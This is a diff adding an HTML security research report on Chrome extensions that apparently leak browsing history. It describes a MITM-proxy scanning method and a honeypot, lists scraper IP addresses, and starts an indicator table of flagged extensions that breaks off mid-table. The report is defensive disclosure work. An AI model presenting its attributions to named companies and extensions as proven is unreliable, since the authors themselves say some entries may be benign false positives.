@@ -1,0 +1,2711 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>README</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    svg {
+      height: auto;
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+    /* CSS for syntax highlighting */
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+</head>
+<body>
+<h1
+id="spying-chrome-extensions-287-extensions-spying-on-37m-users"><em>Spying
+Chrome Extensions: 287 Extensions spying on 37M users</em></h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li>We built an automated scanning pipeline that runs Chrome inside a
+Docker container, routes all traffic through a man‑in‑the‑middle (MITM)
+proxy, and watches for outbound requests that correlate with the length
+of the URLs we feed it.</li>
+<li>Using a leakage metric we flagged 287 Chrome extensions that
+exfiltrate browsing history.</li>
+<li>Those extensions collectively have ~37.4 M installations – roughly
+1 % of the global Chrome user base.</li>
+<li>The actors behind the leaks span the spectrum: Similarweb, Curly
+Doggo, Offidocs, chinese actors, many smaller obscure data‑brokers, and
+a mysterious “Big Star Labs” that appears to be an extended arm of
+Similarweb.</li>
+</ul>
+<h2 id="why">Why?</h2>
+<p>The problem isn’t new. In 2017, M. Weissbacher et al. research on
+malicious browser extensions. In 2018, R. Heaton showed that the popular
+“Stylish” theme manager was silently sending browsing URLs to a remote
+server. Those past reports cought our eye and motivated us to dig into
+this issue.</p>
+<p>Fast forward to 2025: Chome Store now hosts roughly 240 k extensions,
+many of them with hundreds of thousands of users. We knew that we needed
+a scalable, repeatable method to measure whether an extension was
+actually leaking data in the wild.</p>
+<p>It was shown in the past that chrome extensions are used to
+exfiltrate user browser history that is then collected by data brokers
+such as Similarweb and Alexa. We try to prove in this report that
+Similarweb is very much still active and collects data.</p>
+<p>Why does it matter? There is a moral aspect to the whole issue.
+Imagine that you build your business model on data exfiltration via
+innocent looking extensions and using that data to sell them to big
+corporates. Well, that’s how Similarweb is getting part of the data.
+That should remind us that whatever software you are using for free and
+it is not open sourced, you should assume you are the product. The
+second aspect is that it puts the users into danger and potentially this
+could be used for corporate exfiltration. Even if only browsed URLs are
+exfiltrated, they typically contain personal identifications, that way
+bad actors that would pay for the raw collected traffic can try to
+target individuals.</p>
+<h2 id="automated-scan">Automated scan</h2>
+<h3 id="the-source-code">The Source Code</h3>
+<p>We considered sharing the details of the setup, but we considered
+this will only enable attackers to adapt quicker to this method. For
+this reason we will not share the code nor the exact details of the
+setup.</p>
+<p>We developed our internal research framework that was inspired by M.
+Weissbacher et al. work:</p>
+<ol type="1">
+<li>Docker with Chromium based browser.</li>
+<li>MITM proxy.</li>
+<li>Synthetic browsing workloads (increasing consistent payload send to
+google.com, this request never left docker container).</li>
+<li>Simple regression model to see if there is corelation between
+outbound traffic volume and the length of the URLs we request.</li>
+</ol>
+<p><img src="./imgs/exts_scanning_setup.png" /></p>
+<p>The idea was simple: if an extension is just reading the page title
+or injecting CSS, its network footprint should stay flat regardless of
+how long the URL we visit is. If the outbound traffic grows linearly
+with the URL length, we have a high probability that the extension is
+shipping the URL itself (or the entire HTTP request) to a remote
+server.</p>
+<h3 id="capturing-correlating-traffic">Capturing &amp; Correlating
+Traffic</h3>
+<p><code>mitmdump</code> writes every request/response to a JSON file.
+After the run we parse the file and compute for each destination domain
++ endpoint:</p>
+<ul>
+<li>Total bytes sent - <code>bytes_out</code>.</li>
+<li>Sum of compressed URL lengths - <code>payload_size</code>.</li>
+</ul>
+<p>The leakage ratio is defined as:</p>
+<p>bytes_out = R * payload_size + b</p>
+<p>If <code>R ≥ 1.0</code> we consider the endpoint definitely leaking
+(the payload size is at least as big as the URL). If
+<code>0.1 ≤ R &lt; 1.0</code> we flag it as probable leakage and send it
+for manual review. We scanned the leakage in two stages first only 4
+different payload sizes and if the condition
+<code>0.1 ≤ R &lt; 1.0</code> was fullfilled we continued with
+additional differen 6 payload sizes. Considering o naverage 10 minute
+scan it took us 930 CPU days to perform the scan. For scans that would
+take 1 day per extension, different strategy would need to be
+considered. Perhaps only the extensions with higher user counts could be
+scanned for longer period of time.</p>
+<h2 id="the-honeypot">The Honeypot</h2>
+<p>The exfiltrated data can be in some cases sold to data brokers such
+as Similarweb. Data brokers put together those data and can resell them
+further to consumers. M. Weissbacher et al. research showed that third
+parties are interested in scraping those data for unknown reasons,
+perhaps to monetize the information gathered. We set up our own
+honeypots and we supplied the extensions honey URLs.</p>
+<p><img src="/imgs/honeypot.png" /></p>
+<p>Five distinct IP ranges hit the honeypot repeatedly: -
+<code>54.92.107.92</code> – associated with <strong>HashDit</strong>. -
+<code>34.29.32.249</code> – associated with <strong>Blocksi AI Web
+Filter</strong>. - Kontera (multiple NAT’ed AWS IPs) - the biggest
+scraper. - <code>54.209.60.63</code>, <code>nat.aws.kontera.com</code> -
+<code>184.72.121.156</code>, <code>nat-service.aws.kontera.com</code> -
+<code>184.72.115.35</code>, <code>nat-service1.aws.kontera.com</code> -
+<code>54.175.74.27</code>, <code>nat-service3.aws.kontera.com</code> -
+<code>54.86.66.252</code>, <code>nat-service4.aws.kontera.com</code></p>
+<h3 id="iocs">IoCs</h3>
+<p>We should note that probably not all of the browser history leaking
+extensions have malicious intent. The following table provides list of
+leaking extensions that were tagged by the automated scan and aftewards
+the logs were manually inspected to remove false positives. Some of the
+extensions might be benign and may need collect browser history for
+functionallity such as “Avast Online Security &amp; Privacy” for
+example.</p>
+<table>
+<colgroup>
+<col style="width: 46%" />
+<col style="width: 45%" />
+<col style="width: 7%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Chrome Web Store URL</th>
+<th>Extension name</th>
+<th>User count</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gomekmidlodglbbmalcneegieacbdmki</td>
+<td>Avast Online Security &amp; Privacy</td>
+<td>6000000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/lgblnfidahcdcjddiepkckcfdhpknnjh</td>
+<td>Ad Blocker: Stands AdBlocker</td>
+<td>3000000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ofpnmcalabcbjgholdjcjblkibolbppb</td>
+<td>Monica: ChatGPT AI Assistant | DeepSeek, GPT-4o, Claude 3.5, o1
+&amp;More</td>
+<td>3000000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bkkbcggnhapdmkeljlodobbkopceiche</td>
+<td>Pop up blocker for Chrome™ - Poper Blocker</td>
+<td>2000000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fjnbnpbmkenffdnngjfgmeleoegfcffe</td>
+<td>Stylish - Custom themes for any website</td>
+<td>2000000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/akdgnmcogleenhbclghghlkkdndkjdjc</td>
+<td>SEOquake</td>
+<td>1000000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eiimnmioipafcokbfikbljfdeojpcgbh</td>
+<td>BlockSite Block Websites &amp; Stay Focused</td>
+<td>1000000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hoklmmgfnpapgjgcpechhaamimifchmp</td>
+<td>Similarweb - Website Traffic &amp; SEO Checker</td>
+<td>1000000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/njgehaondchbmjmajphnhlojfnbfokng</td>
+<td>Video Downloader PLUS</td>
+<td>1000000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/nllcnknpjnininklegdoijpljgdjkijc</td>
+<td>Wordtune: AI Paraphrasing and Grammar Tool</td>
+<td>1000000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bhmmomiinigofkjcapegjjndpbikblnp</td>
+<td>WOT: Website Security &amp; Safety Checker</td>
+<td>800000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/edjkecefjhobekadlkdkopkggdefpgfp</td>
+<td>Smarty</td>
+<td>800000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/aefehdhdciieocakfobpaaolhipkcpgc</td>
+<td>Simple Allow Copy</td>
+<td>700000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gbdjcgalliefpinpmggefbloehmmknca</td>
+<td>Ad block &amp; Adblocker - No Ads extension</td>
+<td>700000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gjfpmkejnolcfklaaddjnckanhhgegla</td>
+<td>Guardio Protection for Chrome</td>
+<td>700000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jlgkpaicikihijadgifklkbpdajbkhjo</td>
+<td>CrxMouse: Mouse Gestures</td>
+<td>700000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/nbmoafcmbajniiapeidgficgifbfmjfo</td>
+<td>AVG Online Security</td>
+<td>600000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ojplmecpdpgccookcobabopnaifgidhf</td>
+<td>Price History &amp; Tracker, Spend Lens: Buyhatke</td>
+<td>600000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/emalgedpdlghbkikiaeocoblajamonoh</td>
+<td>Karma | Online shopping, but better</td>
+<td>500000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/jajikjbellknnfcomfjjinfjokihcfoi</td>
+<td>Adblock for YouTube &amp; Chrome - All Block</td>
+<td>500000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bmhcbmnbenmcecpmpepghooflbehcack</td>
+<td>Liner: ChatGPT AI Copilot for Web&amp;YouTube&amp;PDF</td>
+<td>400000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dgjbaljgolmlcmmklmmeafecikidmjpi</td>
+<td>Adblock Ad Blocker Pro</td>
+<td>400000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fofjcndophjadilglgimelemjkjblgpf</td>
+<td>ZoomInfo Chrome Extension</td>
+<td>400000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ihmgiclibbndffejedjimfjmfoabpcke</td>
+<td>Mate Translate – translator, dictionary</td>
+<td>400000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jaembmdeobjibglbnnefpalabeohjpnj</td>
+<td>Audio editor online Audacity</td>
+<td>400000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pnedebpjhiaidlbbhmogocmffpdolnek</td>
+<td>CouponBirds - SmartCoupon Coupon Finder</td>
+<td>400000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fonalplhodhnenmokepaijoemaednpjm</td>
+<td>Directo - Travel Deals - Save on Fees</td>
+<td>300000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/kiodaajmphnkcajieajajinghpejdjai</td>
+<td>Popup Blocker Pro</td>
+<td>300000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/lnhnebkkgjmlgomfkkmkoaefbknopmja</td>
+<td>ApkOnline APK manager for Android emulator</td>
+<td>300000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mnoiedledcncagkonmmhbenokojeciib</td>
+<td>Tesla Search</td>
+<td>300000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/necpbmbhhdiplmfhmjicabdeighkndkn</td>
+<td>Similar Sites - Discover Related Websites</td>
+<td>300000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/nfadicbbecgbdbgbibgflooojfbolpgk</td>
+<td>Pie Shopping: Cash Back and Coupons</td>
+<td>300000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/nfmlkliedggdodlbgghmmchhgckjoaml</td>
+<td>Spotify Ad Blocker - Blockify</td>
+<td>300000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/oeicpkgdngoghobnbjngekclpcmpgpij</td>
+<td>EverBee - Find Best Selling Products on Etsy</td>
+<td>300000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eagiakjmjnblliacokhcalebgnhellfi</td>
+<td>Clean Master: the best Chrome Cache Cleaner</td>
+<td>200000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gcfcpohokifjldeandkfjoboemihipmb</td>
+<td>Undetectable AdBlocker</td>
+<td>200000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/lngfncacljheahfpahadgipefkbagpdl</td>
+<td>UltraWide Video</td>
+<td>200000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/omebobahbkampglebglkoagddjnjbhle</td>
+<td>Gimp online - image editor and paint tool</td>
+<td>200000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/aadbahhifnekkkcbapdfandpimaoacmj</td>
+<td>AliPrice Search by image for China import</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bchkdkhfodkkpohjhabdgfhpgjkkgfhg</td>
+<td>AnswerAI - Homework AI Tutor &amp; Study Helper</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bincmiainjofjnhchmcalkanjebghoen</td>
+<td>AG Translate</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/caejcfciegnnnepdhaopdogngbmojodl</td>
+<td>Kimi Explorer</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/condlopdddofpgcdjfnoepbdkcgckmgb</td>
+<td>Translator</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dakkielolpafjbgnjnakddabmbbkcioe</td>
+<td>AegisWeb3</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dghkhbmpagbapkadlehcicngkldfieln</td>
+<td>Google Meet Extension</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/eanofdhdfbcalhflpbdipkjjkoimeeod</td>
+<td>Rewards Search Automator</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/hajphibbdloomfdkeoejchiikjggnaif</td>
+<td>QuestionAI Homework Powered AI Assistant</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hilpchhlogijamlemmggobblmfcdkomg</td>
+<td>Buscapé</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/janmadmcipjiaoenfkimihamjfipgmee</td>
+<td>Shein Coupon Finder</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/kphldkppgfpjadpabfkghmjbhpcmgpdg</td>
+<td>1688 Purchasing Assistant Plugin</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/lopnbnfpjmgpbppclhclehhgafnifija</td>
+<td>Google Translate - Side Panel</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/odfonlkabodgbolnmmkdijkaeggofoop</td>
+<td>Clearly Reader - Your AI Reading Assistant</td>
+<td>100000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ohgkmilcibaoempgifldidkidnbkbeii</td>
+<td>Movie maker MovieStudio video editor</td>
+<td>100000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/aedglnfjjccpifohekdeoogffomjcikm</td>
+<td>Solvely.ai - AI Homework Helper</td>
+<td>90000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dfmpaemifkgbnlgcccccnfjjkeiikeie</td>
+<td>Audio editor &amp; music editor AudioStudio</td>
+<td>90000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ecpkhbhhpfjkkcedaejmpaabpdgcaegc</td>
+<td>1688 AIBUY: Official Global Sourcing AI Agent</td>
+<td>80000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/mhkejggchhilmabpicojddgaahkkgoln</td>
+<td>FranceVerif - Sécurité en ligne</td>
+<td>80000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/npcbllnmpghkdjeaocappkiedkiljhgk</td>
+<td>Android emulator MyAndroid</td>
+<td>80000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dbjldigbjceebginhcnmjnigbocicokh</td>
+<td>1688 search by image</td>
+<td>70000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/aahodnigalncogkhfolddkmkklijeoap</td>
+<td>Gauth - AI Homework &amp; Study Helper</td>
+<td>60000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dnclkkkjlabdgfdjngdkaebpaahnohoo</td>
+<td>Zoom</td>
+<td>60000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gefiaaeadjbmhjndnhedfccdjjlgjhho</td>
+<td>Enhanced Image Viewer</td>
+<td>60000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/gfkpklgmocbcbdabfellcnikamdaeajd</td>
+<td>SimplyCodes - Verified Coupons + Cash Rewards</td>
+<td>60000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/hegneaniplmfjcmohoclabblbahcbjoe</td>
+<td>Video Ad Blocker Plus for YouTube™</td>
+<td>60000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/iojpcjjdfhlcbgjnpngcmaojmlokmeii</td>
+<td>Smart Adblocker</td>
+<td>60000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/kdfinbdncekfhibpbnkjedmdofkjghjj</td>
+<td>Video editor OpenShot online</td>
+<td>60000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/molcibnmfbjmmfbefjfcafdeabfniobi</td>
+<td>Cici, your AI browser assistant.</td>
+<td>60000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pmaonbjcobmgkemldgcedmpbmmncpbgi</td>
+<td>Ubuntu free online linux server</td>
+<td>60000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bcapjlfjbmaijdinncieppinamjgljog</td>
+<td>Inkscape editor for draws and graphics</td>
+<td>50000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bdomjcpneblellajjhgfdlnmjfofflop</td>
+<td>LibreOffice Editor</td>
+<td>50000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/cdbccfkcpkmimlajcjpodelocoeifjhp</td>
+<td>OceanHero: Save Our Oceans with Every New Tab</td>
+<td>50000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/fcejkolobdcfbhhakbhajcflakmnhaff</td>
+<td>Knowee AI (formerly StudyGPT) - Your Homework &amp; Essay
+Helper</td>
+<td>50000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/flfhkellafphdlcigippmenebkodkina</td>
+<td>OpenOffice Writer online for Word documents</td>
+<td>50000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/ggokfoffgmgmkckgeclppfpgfmddbdjg</td>
+<td>Adblock Pro for Youtube™</td>
+<td>50000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/jjjpjmbnbdjhbkclajpagjkefefnednl</td>
+<td>Super PiP - Picture-in-Picture with playback controls and
+subtitles</td>
+<td>50000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/neigoggljhfnodeneidndcflnclldnpm</td>
+<td>שם זה זול יותר</td>
+<td>50000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/agleiimpggapjekcdhdjbmegjbbkleie</td>
+<td>Ground News - Bias Checker</td>
+<td>40000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/bpdjlkbbhlnjlggpbofheohnomnibmmm</td>
+<td>Document Editor for doc &amp; docx</td>
+<td>40000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/dpjgafhldafgelgpilaghplfgecjojgp</td>
+<td>Photo editor PhotoStudio for images</td>
+<td>40000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/dpphkcfmnbkdpmgneljgdhfnccnhmfig</td>
+<td>Relingo - Master vocabulary while browsing websites and watching
+YouTube</td>
+<td>40000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/eemjhliengnnmjmbdjagekdddmkhanna</td>
+<td>ima知识库</td>
+<td>40000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/mffappoadhfalhjgmfaoecjbdjfdfhdj</td>
+<td>PDF editor PDFOffice to edit and create PDF</td>
+<td>40000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ponokiofkijoolhebggofhhibnafebna</td>
+<td>Felo Subtitles: ChatGPT Live Translation</td>
+<td>40000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/begnkfeikebdelojdklgfkbhbeboilne</td>
+<td>Alibaba Search by image</td>
+<td>30000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/bolplfmefepdhhakjbdggjmocjdkjkgb</td>
+<td>PriceTiger</td>
+<td>30000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/cakgpagboibckijdpobichompgagpmnl</td>
+<td>PriceTaco</td>
+<td>30000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/fobklglmhojpeijoioelpdaicagiepbf</td>
+<td>LINE購物省錢助理 - 邊購物邊幫你輕鬆省錢！</td>
+<td>30000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/gnmngcgmijhkamopfhmnkgpebgjbpbja</td>
+<td>DocsWork Editor for documents DOC &amp; DOCX</td>
+<td>30000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/ifjafammaookpiajfbedmacfldaiamgg</td>
+<td>BeeLine Reader</td>
+<td>30000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/lpaboeaccgehipchabmnialhaihbmhji</td>
+<td>Video editor VideoStudio</td>
+<td>30000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/mjackmipnhegkhekpebhmnkhkaojdldn</td>
+<td>BK Reviews</td>
+<td>30000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/pkhpcfoaocmmpmphhenoblggeinedlah</td>
+<td>Dupe.com: Find similar products for less</td>
+<td>30000</td>
+</tr>
+<tr class="odd">
+<td>https://chromewebstore.google.com/detail/aaiolimgbncdaldgbbjkidiijidchhjo</td>
+<td>Shopper.com</td>
+<td>20000</td>
+</tr>
+<tr class="even">
+<td>https://chromewebstore.google.com/detail/aclbkdnphcdelflmgjgmgbahlfngidma</td>
+<td>Dropbox Dash for Business</td>
+<td>20000</td>
+</tr>
+<tr class="odd">
